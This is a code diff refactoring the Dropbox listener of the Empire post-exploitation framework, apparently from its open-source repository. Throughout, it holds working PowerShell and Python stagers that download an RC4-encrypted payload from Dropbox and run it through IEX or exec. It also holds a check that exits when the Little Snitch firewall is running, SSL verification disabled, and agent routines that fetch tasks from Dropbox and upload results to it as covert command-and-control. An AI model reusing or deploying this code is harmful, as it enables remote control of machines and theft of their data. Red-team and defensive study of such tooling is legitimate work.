@@ -6,6 +6,7 @@ import json
 import os
 import time
 from builtins import object, str
+from textwrap import dedent
 from typing import List
 
 import dropbox
@@ -14,7 +15,7 @@ from pydispatch import dispatcher
 from empire.server.common import encryption, helpers, templating
 from empire.server.database import models
 from empire.server.database.base import Session
-from empire.server.utils import data_util
+from empire.server.utils import data_util, listener_util
 
 
 class Listener(object):
@@ -239,9 +240,11 @@ class Listener(object):
 
                         else:
                             # TODO: implement form for other proxy
-                            stager += "$proxy=New-Object Net.WebProxy;"
-                            stager += f"$proxy.Address = '{ proxy.lower() }';"
-                            stager += "$wc.Proxy = $proxy;"
+                            stager += f"""
+                                $proxy=New-Object Net.WebProxy;
+                                $proxy.Address = '{ proxy.lower() }';
+                                $wc.Proxy = $proxy;
+                            """
 
                         if proxyCreds.lower() == "default":
                             stager += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"
@@ -252,8 +255,10 @@ class Listener(object):
                             password = proxyCreds.split(":")[1]
                             domain = username.split("\\")[0]
                             usr = username.split("\\")[1]
-                            stager += f"$netcred = New-Object System.Net.NetworkCredential('{ usr }', '{ password }', '{ domain }');"
-                            stager += "$wc.Proxy.Credentials = $netcred;"
+                            stager += f"""
+                                $netcred = New-Object System.Net.NetworkCredential('{ usr }', '{ password }', '{ domain }');
+                                $wc.Proxy.Credentials = $netcred;
+                            """
 
                         # save the proxy settings to use during the entire staging process and the agent
                         stager += "$Script:Proxy = $wc.Proxy;"
@@ -261,21 +266,28 @@ class Listener(object):
                 # TODO: reimplement stager retries?
 
                 # code to turn the key string into a byte array
-                stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ staging_key }');"
+                stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{staging_key}');"
 
                 # this is the minimized RC4 stager code from rc4.ps1
-                stager += "$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};"
+                stager += listener_util.powershell_rc4()
 
-                # add in the Dropbox auth token and API params
-                stager += f"$t='{ api_token }';"
-                stager += '$wc.Headers.Add("Authorization","Bearer $t");'
-                stager += f'$wc.Headers.Add("Dropbox-API-Arg",\'{{"path":"{ staging_folder }/debugps"}}\');'
+                stager += dedent(
+                    f""" 
+                    # add in the Dropbox auth token and API params
+                    $t='{ api_token }';
+                    $wc.Headers.Add("Authorization","Bearer $t");
+                    $wc.Headers.Add("Dropbox-API-Arg",\'{{"path":"{ staging_folder }/debugps"}}\');
+                    $data=$wc.DownloadData('https://content.dropboxapi.com/2/files/download');
+                    $iv=$data[0..3];$data=$data[4..$data.length];
+                    
+                    # decode everything and kick it over to IEX to kick off execution
+                    -join[Char[]](& $R $data ($IV+$K))|IEX
+                    """
+                )
 
-                stager += "$data=$wc.DownloadData('https://content.dropboxapi.com/2/files/download');"
-                stager += "$iv=$data[0..3];$data=$data[4..$data.length];"
-
-                # decode everything and kick it over to IEX to kick off execution
-                stager += "-join[Char[]](& $R $data ($IV+$K))|IEX"
+                # Remove comments and make one line
+                stager = helpers.strip_powershell_comments(stager)
+                stager = data_util.ps_convert_to_oneliner(stager)
 
                 if obfuscate:
                     stager = data_util.obfuscate(
@@ -295,18 +307,11 @@ class Listener(object):
             elif language.startswith("py"):
                 launcherBase = "import sys;"
                 # monkey patch ssl woohooo
-                launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"
+                launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;"
 
                 try:
                     if safeChecks.lower() == "true":
-                        launcherBase += "import re, subprocess;"
-                        launcherBase += (
-                            'cmd = "ps -ef | grep Little\ Snitch | grep -v grep"\n'
-                        )
-                        launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n"
-                        launcherBase += "out, err = ps.communicate()\n"
-                        launcherBase += 'if re.search("Little Snitch", out):\n'
-                        launcherBase += "   sys.exit()\n"
+                        launcherBase += listener_util.python_safe_checks()
                 except Exception as e:
                     p = "[!] Error setting LittleSnitch in stager: " + str(e)
                     print(helpers.color(p, color="red"))
@@ -315,19 +320,17 @@ class Listener(object):
                     profile = listenerOptions["DefaultProfile"]["Value"]
                     userAgent = profile.split("|")[1]
 
-                launcherBase += "import urllib.request;\n"
-                launcherBase += "UA='%s';" % (userAgent)
-                launcherBase += "t='%s';" % (api_token)
-                launcherBase += (
-                    "server='https://content.dropboxapi.com/2/files/download';"
-                )
-
-                launcherBase += "req=urllib.request.Request(server);\n"
-                launcherBase += "req.add_header('User-Agent',UA);\n"
-                launcherBase += 'req.add_header("Authorization","Bearer "+t);'
-                launcherBase += (
-                    'req.add_header("Dropbox-API-Arg",\'{"path":"%s/debugpy"}\');\n'
-                    % (staging_folder)
+                launcherBase += dedent(
+                    f"""
+                    import urllib.request;
+                    UA='{ userAgent }';
+                    t='{ api_token }';
+                    server='https://content.dropboxapi.com/2/files/download';
+                    req=urllib.request.Request(server);
+                    req.add_header('User-Agent',UA);
+                    req.add_header("Authorization","Bearer "+t);
+                    req.add_header("Dropbox-API-Arg",'{{"path":"{ staging_folder }/debugpy"}}');
+                    """
                 )
 
                 if proxy.lower() != "none":
@@ -335,13 +338,7 @@ class Listener(object):
                         launcherBase += "proxy = urllib.request.ProxyHandler();\n"
                     else:
                         proto = proxy.Split(":")[0]
-                        launcherBase += (
-                            "proxy = urllib.request.ProxyHandler({'"
-                            + proto
-                            + "':'"
-                            + proxy
-                            + "'});\n"
-                        )
+                        launcherBase += f"proxy = urllib.request.ProxyHandler({{'{proto}':'{proxy}'}});\n"
 
                     if proxyCreds != "none":
                         if proxyCreds == "default":
@@ -350,16 +347,12 @@ class Listener(object):
                             launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();\n"
                             username = proxyCreds.split(":")[0]
                             password = proxyCreds.split(":")[1]
-                            launcherBase += (
-                                "proxy_auth_handler.add_password(None,'"
-                                + proxy
-                                + "','"
-                                + username
-                                + "','"
-                                + password
-                                + "');\n"
+                            launcherBase += dedent(
+                                f"""
+                                proxy_auth_handler.add_password(None,'{ proxy }', '{ username }', '{ password }');
+                                o = urllib.request.build_opener(proxy, proxy_auth_handler);
+                            """
                             )
-                            launcherBase += "o = urllib.request.build_opener(proxy, proxy_auth_handler);\n"
                     else:
                         launcherBase += "o = urllib.request.build_opener(proxy);\n"
                 else:
@@ -367,24 +360,10 @@ class Listener(object):
 
                 # install proxy and creds globally, so they can be used with urlopen.
                 launcherBase += "urllib.request.install_opener(o);\n"
-
                 launcherBase += "a=urllib.request.urlopen(req).read();\n"
-                launcherBase += "IV=a[0:4];"
-                launcherBase += "data=a[4:];"
-                launcherBase += "key=IV+'%s';" % (staging_key)
 
                 # RC4 decryption
-                launcherBase += "S,j,out=list(range(256)),0,[]\n"
-                launcherBase += "for i in list(range(256)):\n"
-                launcherBase += "    j=(j+S[i]+key[i%len(key)])%256\n"
-                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
-                launcherBase += "i=j=0\n"
-                launcherBase += "for char in data:\n"
-                launcherBase += "    i=(i+1)%256\n"
-                launcherBase += "    j=(j+S[i])%256\n"
-                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
-                launcherBase += "    out.append(chr(char^S[(S[i]+S[j])%256]))\n"
-                launcherBase += "exec(''.join(out))"
+                launcherBase += listener_util.python_extract_stager(staging_key)
 
                 if encode:
                     launchEncoded = base64.b64encode(
@@ -638,84 +617,51 @@ class Listener(object):
         if language:
             if language.lower() == "powershell":
 
-                updateServers = """
-    $Script:APIToken = "%s";
-                """ % (
-                    apiToken
-                )
+                updateServers = f'$Script:APIToken = "{apiToken}";'
 
-                getTask = (
-                    """
-    $script:GetTask = {
-        try {
+                getTask = f"""
+    $script:GetTask = {{
+        try {{
             # build the web request object
-            $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """ = New-Object System.Net.WebClient
+            $wc= New-Object System.Net.WebClient
 
             # set the proxy settings for the WC to be the default system settings
-            $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-            $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-            if($Script:Proxy) {
-                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Proxy = $Script:Proxy;
-            }
+            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+            if($Script:Proxy) {{
+                $wc.Proxy = $Script:Proxy;
+            }}
 
-            $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Headers.Add("User-Agent", $script:UserAgent)
-            $Script:Headers.GetEnumerator() | ForEach-Object {$"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Headers.Add($_.Name, $_.Value)}
+            $wc.Headers.Add("User-Agent", $script:UserAgent)
+            $Script:Headers.GetEnumerator() | ForEach-Object {{$wc.Headers.Add($_.Name, $_.Value)}}
 
-            $TaskingsFolder = '"""
-                    + taskingsFolder
-                    + """'
-            $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Headers.Set("Authorization", "Bearer $($Script:APIToken)")
-            $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Headers.Set("Dropbox-API-Arg", "{`"path`":`"$TaskingsFolder/$($script:SessionID).txt`"}")
-            $Data = $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.DownloadData("https://content.dropboxapi.com/2/files/download")
+            $TaskingsFolder = '{taskingsFolder}'
+            $wc.Headers.Set("Authorization", "Bearer $($Script:APIToken)")
+            $wc.Headers.Set("Dropbox-API-Arg", "{{`"path`":`"$TaskingsFolder/$($script:SessionID).txt`"}}")
+            $Data = $wc.DownloadData("https://content.dropboxapi.com/2/files/download")
 
-            if($Data -and ($Data.Length -ne 0)) {
+            if($Data -and ($Data.Length -ne 0)) {{
                 # if there was a tasking data, remove it
-                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Headers.Add("Content-Type", " application/json")
-                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Headers.Remove("Dropbox-API-Arg")
-                $Null=$"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.UploadString("https://api.dropboxapi.com/2/files/delete", "POST", "{`"path`":`"$TaskingsFolder/$($script:SessionID).txt`"}")
+                $wc.Headers.Add("Content-Type", " application/json")
+                $wc.Headers.Remove("Dropbox-API-Arg")
+                $Null=$wc.UploadString("https://api.dropboxapi.com/2/files/delete", "POST", "{{`"path`":`"$TaskingsFolder/$($script:SessionID).txt`"}}")
                 $Data
-            }
+            }}
             $script:MissedCheckins = 0
-        }
-        catch {
-            if ($_ -match 'Unable to connect') {
+        }}
+        catch {{
+            if ($_ -match 'Unable to connect') {{
                 $script:MissedCheckins += 1
-            }
-        }
-    }
+            }}
+        }}
+    }}
                 """
-                )
 
-                sendMessage = (
-                    """
-    $script:SendMessage = {
+                sendMessage = f"""
+    $script:SendMessage = {{
         param($Packets)
 
-        if($Packets) {
+        if($Packets) {{
             # build and encrypt the response packet
             $EncBytes = Encrypt-Bytes $Packets
 
@@ -724,92 +670,55 @@ class Listener(object):
             $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5
 
             # build the web request object
-            $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """ = New-Object System.Net.WebClient
+            $wc = New-Object System.Net.WebClient
             # set the proxy settings for the WC to be the default system settings
-            $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-            $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-            if($Script:Proxy) {
-                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Proxy = $Script:Proxy;
-            }
+            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+            if($Script:Proxy) {{
+                $wc.Proxy = $Script:Proxy;
+            }}
 
-            $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Headers.Add('User-Agent', $Script:UserAgent)
-            $Script:Headers.GetEnumerator() | ForEach-Object {$"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Headers.Add($_.Name, $_.Value)}
+            $wc.Headers.Add('User-Agent', $Script:UserAgent)
+            $Script:Headers.GetEnumerator() | ForEach-Object {{$wc.Headers.Add($_.Name, $_.Value)}}
 
-            $ResultsFolder = '"""
-                    + resultsFolder
-                    + """'
+            $ResultsFolder = '{resultsFolder}'
 
-            try {
+            try {{
                 # check if the results file is still in the specified location, if so then
                 #   download the file and append the new routing packet to it
-                try {
+                try {{
                     $Data = $Null
-                    $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Headers.Set("Authorization", "Bearer $($Script:APIToken)");
-                    $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Headers.Set("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}");
-                    $Data = $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.DownloadData("https://content.dropboxapi.com/2/files/download")
-                }
-                catch { }
+                    $wc.Headers.Set("Authorization", "Bearer $($Script:APIToken)");
+                    $wc.Headers.Set("Dropbox-API-Arg", "{{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}}");
+                    $Data = $wc.DownloadData("https://content.dropboxapi.com/2/files/download")
+                }}
+                catch {{ }}
 
-                if($Data -and $Data.Length -ne 0) {
+                if($Data -and $Data.Length -ne 0) {{
                     $RoutingPacket = $Data + $RoutingPacket
-                }
+                }}
 
-                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """2 = New-Object System.Net.WebClient
-                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """2.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """2.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-                if($Script:Proxy) {
-                    $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """2.Proxy = $Script:Proxy;
-                }
+                $wc2 = New-Object System.Net.WebClient
+                $wc2.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+                $wc2.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+                if($Script:Proxy) {{
+                    $wc2.Proxy = $Script:Proxy;
+                }}
 
-                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """2.Headers.Add("Authorization", "Bearer $($Script:APIToken)")
-                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """2.Headers.Add("Content-Type", "application/octet-stream")
-                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """2.Headers.Add("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}");
-                $Null = $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """2.UploadData("https://content.dropboxapi.com/2/files/upload", "POST", $RoutingPacket)
+                $wc2.Headers.Add("Authorization", "Bearer $($Script:APIToken)")
+                $wc2.Headers.Add("Content-Type", "application/octet-stream")
+                $wc2.Headers.Add("Dropbox-API-Arg", "{{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}}");
+                $Null = $wc2.UploadData("https://content.dropboxapi.com/2/files/upload", "POST", $RoutingPacket)
                 $script:MissedCheckins = 0
-            }
-            catch {
-                if ($_ -match 'Unable to connect') {
+            }}
+            catch {{
+                if ($_ -match 'Unable to connect') {{
                     $script:MissedCheckins += 1
-                }
-            }
-        }
-    }
+                }}
+            }}
+        }}
+    }}
                 """
-                )
 
                 return updateServers + getTask + sendMessage
 
